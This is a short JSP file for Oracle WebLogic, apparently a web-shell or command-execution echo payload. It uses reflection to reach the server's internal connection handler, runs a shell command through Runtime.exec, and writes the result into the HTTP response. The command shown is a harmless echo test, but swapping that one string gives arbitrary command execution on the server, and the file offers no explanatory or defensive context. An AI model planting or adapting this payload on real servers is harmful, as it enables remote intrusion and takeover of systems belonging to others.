<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
	weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread)Thread.currentThread();
    java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)executeThread.getCurrentWork()).getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    weblogic.servlet.internal.HttpConnectionHandler httpConn = (weblogic.servlet.internal.HttpConnectionHandler) field.get(executeThread.getCurrentWork());
    String cmd = "echo \"It works!\"";
    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
    httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(res));
    httpConn.getServletRequest().getResponse().getServletOutputStream().flush();
    httpConn.getServletRequest().getResponse().getWriter().write("");
%>